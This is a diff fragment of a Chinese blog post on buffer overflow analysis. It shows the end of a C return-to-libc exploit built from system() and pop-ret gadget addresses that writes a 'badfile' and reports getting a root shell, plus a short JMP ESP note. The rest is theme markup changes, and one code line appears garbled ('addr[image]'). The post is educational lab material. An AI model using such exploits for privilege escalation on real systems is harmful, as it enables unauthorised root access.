 <div class="highlight" id="id-10"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
 </span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
 </span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
 </span></span></span><span class="line"><span class="cl"><span class="cp"></span>
-</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">addr</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">addr</span><span class="p">[</span><span class="n">image</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">  <span class="mh">0xb7e5f430</span> <span class="p">,</span> <span class="c1">// system()
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="mh">0x0804856f</span> <span class="p">,</span> <span class="c1">// pop-ret
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="mh">0xbffff688</span> <span class="p">,</span> <span class="c1">// e1=&#34;echo E421140XX&#34;
@@ -436,7 +438,7 @@ execve(&#34;/bin//sh&#34;, [&#34;/bin//sh&#34;], NULL)
 </span></span><span class="line"><span class="cl">  <span class="n">fclose</span><span class="p">(</span><span class="n">badfile</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>编译运行，成功得到 root shell。</p>
-<p><img loading="lazy" src="/001/16.png" srcset="/001/16.png, /001/16.png 1.5x, /001/16.png 2x" sizes="auto" data-title="image" data-alt="image" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p><img loading="lazy" src="/001/16.png" srcset="/001/16.png 1x, /001/16.png 1.5x, /001/16.png 1.5x" sizes="auto" data-title="image" data-alt="image" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 <h2 id="6-地址随机化jmp-esp">6. 地址随机化：JMP ESP</h2>
 <p>如果开启了随机化，我们可以通过将返回地址覆写为 jmp esp，这样程序仍会停留在原先 esp 的位置上。我们紧随其后写入提权 shellcode 即可使实现攻击。</p>
 <p>详细原理和例题先咕着 QwQ。</p></div><div class="post-footer" id="post-footer">
@@ -448,7 +450,7 @@ execve(&#34;/bin//sh&#34;, [&#34;/bin//sh&#34;], NULL)
     <div class="post-info-line">
       <div class="post-info-md"></div>
       <div class="post-info-share">
-        <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="http://example.org/posts/vul1/" data-title="漏洞分析：缓冲区溢出" data-hashtags="信息安全,Article"><i class="fa-brands fa-twitter fa-fw" aria-hidden="true"></i></a>
+        <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="http://example.org/posts/vul1/" data-title="漏洞分析：缓冲区溢出" data-hashtags="信息安全,笔记"><i class="fa-brands fa-twitter fa-fw" aria-hidden="true"></i></a>
   <a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="http://example.org/posts/vul1/" data-hashtag="信息安全"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
   <a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="http://example.org/posts/vul1/" data-title="漏洞分析：缓冲区溢出"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
   </span>
@@ -457,13 +459,14 @@ execve(&#34;/bin//sh&#34;, [&#34;/bin//sh&#34;], NULL)
   </div>
 
   <div class="post-info-more">
-    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href='/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/' class="post-tag">信息安全</a><a href='/tags/article/' class="post-tag">Article</a></section>
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href='/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/' class="post-tag">信息安全</a><a href='/tags/%E7%AC%94%E8%AE%B0/' class="post-tag">笔记</a></section>
     <section>
       <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
     </section>
   </div>
 
-  <div class="post-nav"></div>
+  <div class="post-nav">
+      <a href="/posts/crossmodel/" class="post-nav-item" rel="next" title="《Cross-Modal Object Tracking ...》 论文阅读笔记">《Cross-Modal Object Tracking ...》 论文阅读笔记<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
 </div>
 </article></main><footer class="footer">
     <div class="footer-container"><div class="footer-line powered">由 <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.116.1">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.2.18"><img class="fixit-icon" src="/fixit.min.svg" alt="FixIt logo" />&nbsp;FixIt</a>
